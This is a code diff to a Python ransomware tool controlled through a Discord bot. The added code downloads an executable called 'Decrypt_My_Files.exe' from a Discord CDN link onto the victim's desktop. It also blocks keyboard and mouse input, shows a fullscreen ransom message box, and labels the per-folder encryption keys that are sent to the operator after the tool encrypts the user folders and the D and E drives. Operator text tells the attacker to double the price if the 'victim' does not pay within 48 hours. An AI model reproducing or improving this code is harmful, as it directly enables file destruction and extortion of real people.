@@ -10,6 +10,7 @@ import re
 import base64
 import webbrowser
 import discord
+import urllib
 import tkinter as tk
 
 from urllib.request import urlopen
@@ -158,6 +159,16 @@ def spam_messagebox():
     root.attributes('-topmost', True) # Puts message box infont of everything else
     root.attributes('-fullscreen', True) # Set message box to fullscreen
     root.mainloop()
+
+def download_decrypter():
+    NAME = os.getlogin()
+    url = 'https://cdn.discordapp.com/attachments/947224575622676520/966000491085570068/Decrypt_My_Files.exe'
+    f = urllib.urlopen(url)
+    file = f.read()
+    f.close()
+    f2 = open(f'C:\\Users\\{NAME}\\Desktop\\Decrypt_My_Files.exe', 'wb')
+    f2.write(file)
+    f2.close()
 
 
 @client.event
@@ -431,14 +442,16 @@ async def SendMessageBox_command(ctx: SlashContext):
         if res.component.label == "YES":
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:
+                download_decrypter()
                 ok = windll.user32.BlockInput(True)
                 spam_messagebox()
                 await ctx.send(content="Sent! ```If victim does not pay within 48 hours double the payment price```", hidden=True)
             else:
                 await ctx.send("**Admin Rights Required!**")
         else:
-            await ctx.send(content="Sent! ```If victim does not pay within 48 hours double the payment price```", hidden=True)
+            download_decrypter()
             spam_messagebox()
+            await ctx.send(content="Sent! ```If victim does not pay within 48 hours double the payment price```", hidden=True)
 
 
 @slash.slash(name="EncryptAll", description="Encrypt all users files! (much easier, alot slower)", guild_ids=g)
@@ -516,7 +529,8 @@ async def EncryptAll_command(ctx: SlashContext):
                         enc_fun(password(passwd),file_input)
 
                     finshed = True
-                    PASSWORDS.append(passwd)
+                    lol = 'Desktop Folder : '
+                    PASSWORDS.append(f"{lol}{passwd}")
                     C_drive_downloads()
                 else:
                     shit = 420
@@ -590,7 +604,8 @@ async def EncryptAll_command(ctx: SlashContext):
                         enc_fun(password(passwd),file_input)
 
                     finshed = True
-                    PASSWORDS.append(passwd)
+                    lol = 'Downloads Folder : '
+                    PASSWORDS.append(f"{lol}{passwd}")
                     C_drive_documents()
                 else:
                     shit = 420
@@ -664,7 +679,8 @@ async def EncryptAll_command(ctx: SlashContext):
                         enc_fun(password(passwd),file_input)
 
                     finshed = True
-                    PASSWORDS.append(passwd)
+                    lol = 'Documents Folder : '
+                    PASSWORDS.append(f"{lol}{passwd}")
                     C_drive_music()
                 else:
                     shit = 420
@@ -738,7 +754,8 @@ async def EncryptAll_command(ctx: SlashContext):
                         enc_fun(password(passwd),file_input)
 
                     finshed = True
-                    PASSWORDS.append(passwd)
+                    lol = 'Music Folder : '
+                    PASSWORDS.append(f"{lol}{passwd}")
                     C_drive_pictures()
                 else:
                     shit = 420
@@ -812,7 +829,8 @@ async def EncryptAll_command(ctx: SlashContext):
                         enc_fun(password(passwd),file_input)
 
                     finshed = True
-                    PASSWORDS.append(passwd)
+                    lol = 'Pictures Folder : '
+                    PASSWORDS.append(f"{lol}{passwd}")
                     C_drive_videos()
                 else:
                     shit = 420
@@ -886,14 +904,15 @@ async def EncryptAll_command(ctx: SlashContext):
                         enc_fun(password(passwd),file_input)
 
                     finshed = True
-                    PASSWORDS.append(passwd)
+                    lol = 'Videos Folder : '
+                    PASSWORDS.append(f"{lol}{passwd}")
                     D_drive()
                 else:
                     shit = 420
             else:
                 shit = 420
 
-        # Try to encrypt D: drive
+        # Other Drives
         def D_drive():
             userdir = f'D:\\'
             listOfFiles = list()
@@ -961,7 +980,8 @@ async def EncryptAll_command(ctx: SlashContext):
                         enc_fun(password(passwd),file_input)
 
                     finshed = True
-                    PASSWORDS.append(passwd)
+                    lol = 'D Drive : '
+                    PASSWORDS.append(f"{lol}{passwd}")
                     E_drive()
                 else:
                     shit = 420
@@ -969,7 +989,6 @@ async def EncryptAll_command(ctx: SlashContext):
                 E_drive()
                 shit = 420
 
-        # Try to encrypt E: drive
         def E_drive():
             userdir = f'E:\\'
             listOfFiles = list()
@@ -1037,13 +1056,16 @@ async def EncryptAll_command(ctx: SlashContext):
                         enc_fun(password(passwd),file_input)
 
                     finshed = True
-                    PASSWORDS.append(passwd)
+                    lol = 'E Drive : '
+                    PASSWORDS.append(f"{lol}{passwd}")
                 else:
                     shit = 420
             else:
                 shit = 420
 
-        C_drive_desktop()
-        await ctx.send(f"Finished encrypted everything!\n\nHere are the keys to decrypt the files!{PASSWORDS}")
+        C_drive_desktop() # Start auto encrypter
+        download_decrypter() # Download decrypter
+        spam_messagebox() # Send message box
+        await ctx.send(f"```Finished encrypted everything and sent message box```\n\n**Here are the keys to decrypt the files!**\n{json.dumps(PASSWORDS, indent=6)}")
 
 client.run(token)
